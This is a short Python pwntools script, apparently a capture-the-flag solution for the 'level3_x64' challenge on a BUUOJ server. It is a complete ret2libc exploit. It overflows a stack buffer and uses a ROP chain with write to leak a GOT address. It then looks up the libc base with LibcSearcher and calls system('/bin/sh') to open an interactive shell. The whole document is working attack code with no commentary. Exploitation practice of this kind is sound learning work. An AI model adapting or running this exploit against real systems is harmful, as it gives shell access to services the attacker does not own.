from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
elf = ELF('./level3_x64')
r = remote('node3.buuoj.cn', 27738)
pop_rdi_addr = 0x4006b3
pop_rsi_addr = 0x4006b1
vuln_func_addr = 0x4005E6

r.recvline()
r.send('a' * 0x88 + flat([pop_rdi_addr, 1, pop_rsi_addr, elf.got['read'], 0, elf.plt['write'], vuln_func_addr]))
read_addr = u64(r.recv(6).ljust(8, '\x00'))
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
r.recvline()
r.send('a' * 0x88 + flat([pop_rdi_addr, bin_sh_addr, system_addr]))
r.interactive()
